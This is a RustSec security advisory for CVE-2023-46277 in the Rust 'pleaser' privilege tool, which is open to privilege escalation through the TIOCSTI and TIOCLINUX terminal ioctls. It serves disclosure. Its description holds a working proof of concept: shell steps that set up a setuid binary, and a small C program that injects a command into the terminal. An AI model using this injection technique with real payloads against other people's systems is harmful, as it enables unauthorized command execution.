

RUSTSEC-2023-0066: pleaser: Vulnerable to privilege escalation using ioctls TIOCSTI and TIOCLINUX › RustSec Advisory Database

#

[About](/)
[Advisories](/advisories/)
[Report Vulnerabilities](/contributing.html)

[History](https://github.com/RustSec/advisory-db/commits/main/crates/pleaser/RUSTSEC-2023-0066.md) ⋅
[Edit](https://github.com/RustSec/advisory-db/edit/main/crates/pleaser/RUSTSEC-2023-0066.md) ⋅
[JSON (OSV)](https://api.osv.dev/v1/vulns/RUSTSEC-2023-0066)

# RUSTSEC-2023-0066

Vulnerable to privilege escalation using ioctls TIOCSTI and TIOCLINUX

Reported
April 29, 2023

Issued
October 3, 2023

(last modified: February 10, 2024)

Package
[pleaser](/packages/pleaser.html)
([crates.io](https://crates.io/crates/pleaser))

Type
Vulnerability

Categories

* [privilege-escalation](/categories/privilege-escalation.html)

Aliases

* [CVE-2023-46277](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-46277)
* [GHSA-cgf8-h3fp-h956](https://github.com/advisories/GHSA-cgf8-h3fp-h956)

References

* <https://gitlab.com/edneville/please/-/issues/13>

CVSS Score
4.6
MEDIUM

CVSS Details
Attack vectorLocal
Attack complexityLow
Privileges requiredLow
User interactionRequired
ScopeChanged
ConfidentialityLow
IntegrityLow
AvailabilityNone

CVSS Vector
[CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)
Patched
no patched versions

### Description

please is vulnerable to privilege escalation using ioctls TIOCSTI
and TIOCLINUX on systems where they are not disabled.

Here is how to see it in action:

```
$ cd "$(mktemp -d)"
$ git clone --depth 1 https://gitlab.com/edneville/please.git
$ cd please/
$ git rev-parse HEAD  # f3598f8fae5455a8ecf22afca19eaba7be5053c9
$ cargo test && cargo build --release
$ echo "[${USER}_as_nobody]"$'\nname='"${USER}"$'\ntarget=nobody\nrule=.*\nrequire_pass=false' | sudo tee /etc/please.ini
$ sudo chown root:root ./target/release/please
$ sudo chmod u+s ./target/release/please
$ cat <<TIOCSTI_C_EOF | tee TIOCSTI.c
#include <sys/ioctl.h>

int main(void) {
  const char *text = "id\n";
  while (*text)
    ioctl(0, TIOCSTI, text++);
  return 0;
}
TIOCSTI_C_EOF
$ gcc -std=c99 -Wall -Wextra -pedantic -o /tmp/TIOCSTI TIOCSTI.c
$ ./target/release/please -u nobody /tmp/TIOCSTI  # runs id(1) as ${USER} rather than nobody

```

Please note that:

This affects both the case where root wants to drop privileges as well when non-root wants to gain other privileges.

Advisory available under [CC0-1.0](https://spdx.org/licenses/CC0-1.0.html)
license.

